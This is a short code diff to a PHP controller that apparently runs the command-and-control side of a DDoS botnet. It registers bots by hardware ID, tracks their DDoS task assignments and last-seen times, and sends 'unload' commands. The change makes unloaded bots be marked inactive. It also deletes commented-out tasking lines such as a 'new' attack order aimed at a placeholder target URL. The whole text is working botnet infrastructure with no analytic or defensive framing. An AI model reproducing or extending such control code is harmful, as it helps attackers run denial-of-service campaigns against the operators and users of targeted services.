@@ -12,6 +12,8 @@ class ddosHandlerController{
             if($user !== false) {
                 if($user["active"] == 2 ){
                     echo "unload";
+                    $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET active = ? WHERE botid = ?");
+                    $statement->execute(array("none",$_POST["hwid"]));
                     die();
                 }
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET lastseen = ?, ddos_taskid = ?, active = ?  WHERE botid = ?");
@@ -42,11 +44,6 @@ class ddosHandlerController{
 
             }
         }
-
-
-
-        //echo "kill";
-        //echo "new;1;http://target.com";
         die();
     }
 
